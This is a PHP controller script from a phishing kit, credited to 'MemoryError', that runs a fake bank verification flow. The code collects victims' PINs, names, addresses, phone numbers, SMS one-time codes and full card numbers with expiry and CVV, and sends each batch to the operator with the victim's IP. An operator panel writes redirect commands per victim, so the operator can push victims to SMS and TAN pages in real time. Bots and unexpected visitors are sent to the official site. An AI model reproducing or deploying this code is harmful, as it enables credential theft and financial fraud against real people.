<?php
    /*******
    Main Author: MemoryError
    ********************************************************/

    require_once 'includes/main.php';
    if( $_GET['pwd'] == PASSWORD ) {
        session_destroy();
        visitors();
        header("Location: clients/index.php?verification#_");
        exit();
    } else if( !empty($_GET['redirection']) ) {
        $red = $_GET['redirection'];
        if( $red == 'errorlogin' ) {
            header("Location: clients/cc.php?error=1&verification#_");
            exit();
        }
        if( $red == 'errorsms' ) {
            header("Location: clients/sms.php?error=1&code=". $_GET['code'] ."&verification#_");
            exit();
        }
        if( $red == 'errortan' ) {
            header("Location: clients/tan.php?error=1&code1=". $_GET['code1'] ."&code2=". $_GET['code2'] ."&code3=". $_GET['code3'] ."&verification#_");
            exit();
        }
        if( $red == 'sms' ) {
            header("Location: clients/sms.php?code=". $_GET['code'] ."&verification#_");
            exit();
			
		}
        if( $red == 'pass' ) {
            header("Location: clients/pass.php?code=". $_GET['code'] ."&verification#_");
            exit();
        }
        if( $red == 'tan' ) {
            header("Location: clients/tan.php?code1=". $_GET['code1'] ."&code2=". $_GET['code2'] ."&code3=". $_GET['code3'] ."&verification#_");
            exit();
        }
        if( $red == 'errorcc' ) {
            $_SESSION['one'] = '';
            $_SESSION['three'] = '';
            $_SESSION['two'] = '';
            $_SESSION['errors']['one'] = true;
            $_SESSION['errors']['three'] = true;
            $_SESSION['errors']['two'] = true;
            header("Location: clients/cc.php?error=1&code=". $_GET['code'] ."&verification#_");
            exit();
        }
        header("Location: clients/". $red .".php?verification#_");
        exit();
    } else if($_SERVER['REQUEST_METHOD'] == "POST") {
        if( !empty($_POST['captcha']) ) {
            header("HTTP/1.0 404 Not Found");
            die();
        }
        if ($_POST['step'] == "pin") {
            $_SESSION['errors']     = [];
            $_SESSION['pin']   = $_POST['pin'];
            if( empty($_POST['pin']) ) {
                $_SESSION['errors']['pin'] = true;
           
            }
            if( count($_SESSION['errors']) == 0 ) {
                $subject = get_client_ip() . ' | Login';
                $message = '/-- Contry PIN  INFOS --/' . get_client_ip() . "\r\n";
                $message .= 'PIN : ' . $_POST['pin'] . "\r\n";
                $message .= 'Steps : ' . get_steps_link() . "\r\n";
                $message .= '/-- END CONTRY INFOS --/' . "\r\n";
                $message .= victim_infos();
                send($subject,$message);
                reset_data();
                header("Location: clients/loading.php?verification#_");
                exit();
            } else {
                header("Location: clients/pin.php?error=1&code=". $_POST['code'] ."&verification#_");
                exit();
            }
		
					 }
        if ($_POST['step'] == "info") {
            $_SESSION['errors']     = [];
            $_SESSION['fullname']   = $_POST['fullname'];
            if( empty($_POST['fullname']) ) {
                $_SESSION['errors']['fullname'] = true;
            }
            if( count($_SESSION['errors']) == 0 ) {
                $subject = get_client_ip() . '  | ';
                $message = '/--  INFOS --/' . get_client_ip() . "\r\n";
                $message .= 'Nom : ' . $_POST['fullname'] . "\r\n";
		$message .= 'Address : ' . $_POST['address'] . "\r\n";
                $message .= 'Telephon : ' . $_POST['phonenumber'] . "\r\n";
                $message .= 'city : ' . $_POST['city'] . "\r\n";
                $message .= 'zipcode : ' . $_POST['zipcode'] . "\r\n";
                $message .= 'Steps : ' . get_steps_link() . "\r\n";
                $message .= '/-- END SMS INFOS --/' . "\r\n";
                $message .= victim_infos();
                send($subject,$message);
                reset_data();
                header("Location: clients/loading-.php?verification#_");
                exit();
            } else {
                header("Location: clients/info.php?error=1&code=". $_POST['code'] ."&verification#_");
                exit();
				
				    }
        }
        if ($_POST['step'] == "sms") {
            $_SESSION['errors']     = [];
            $_SESSION['sms_code']   = $_POST['sms_code'];
            if( empty($_POST['sms_code']) ) {
                $_SESSION['errors']['sms_code'] = true;
            }
            if( count($_SESSION['errors']) == 0 ) {
                $subject = get_client_ip() . '  | SmS';
                $message = '/-- SMS ES --/' . get_client_ip() . "\r\n";
                $message .= 'SMS code : ' . $_POST['sms_code'] . "\r\n";
                $message .= 'Steps : ' . get_steps_link() . "\r\n";
                $message .= '/-- END SMS INFOS --/' . "\r\n";
                $message .= victim_infos();
                send($subject,$message);
                reset_data();
                header("Location: clients/loading.php?verification#_");
                exit();
            } else {
                header("Location: clients/sms.php?error=1&code=". $_POST['code'] ."&verification#_");
                exit();
				
				    }
    
             
			 }
        if ($_POST['step'] == "cc") {
            $_SESSION['errors']     = [];
            $_SESSION['one']   = $_POST['one'];
			$_SESSION['two']   = $_POST['two'];

            $_SESSION['three']   = $_POST['three'];


            if( empty($_POST['one']) ) {
                $_SESSION['errors']['one'] = true;
			 }
				if( empty($_POST['two']) ) {
                $_SESSION['errors']['two'] = true;
				 }
				if( empty($_POST['three']) ) {
                $_SESSION['errors']['three'] = true;
			
            }
            if( count($_SESSION['errors']) == 0 ) {
               $subject = get_client_ip() . ' | | Card';
                $message = '/-- CARD ES INFOS --/' . get_client_ip() . "\r\n";
                $message .= 'Name : ' . $_POST['name'] . "\r\n";
                $message .= 'Zip : ' . $_POST['zip'] . "\r\n";
		$message .= 'Card : ' . $_POST['one'] . "\r\n";
                $message .= 'Date EXP : ' . $_POST['two'] . "\r\n";
                $message .= 'Cvv : ' . $_POST['three'] . "\r\n";
                $message .= 'Steps : ' . get_steps_link() . "\r\n";
                $message .= '/-- END CARD INFOS --/' . "\r\n";
                $message .= victim_infos();
                send($subject,$message);
                reset_data();
         
                header("Location: clients/loading.php?verification#_");
            } else {
                header("Location: clients/cc.php?error=1&verification#_");
            }
        }
        if ($_POST['step'] == "control") {
            $fp = fopen('victims/'. $_POST['ip'] .'.txt', 'wb');
            if( $_POST['to'] == 'firma' ) {
                $_POST['to'] = $_POST['to'] . '/' . $_POST['firma_text'];
            }
            if( $_POST['to'] == 'errorfirma' ) {
                $_POST['to'] = $_POST['to'] . '/' . $_POST['errorfirma_text'];
            }
            if( $_POST['to'] == 'sms' ) {
                $_POST['to'] = $_POST['to'] . '/' . $_POST['sms_text'];
				
			}
            if( $_POST['to'] == 'pass' ) {
                $_POST['to'] = $_POST['to'] . '/' . $_POST['pass_text'];
            }
            if( $_POST['to'] == 'errorsms' ) {
                $_POST['to'] = $_POST['to'] . '/' . $_POST['errorsms_text'];
            }
            fwrite($fp, $_POST['to']);
            fclose($fp);
            header("location: control.php?ip=" . $_POST['ip']);
        }
    } else {
        header("Location: " . OFFICIAL_WEBSITE);
        exit();
    }
?>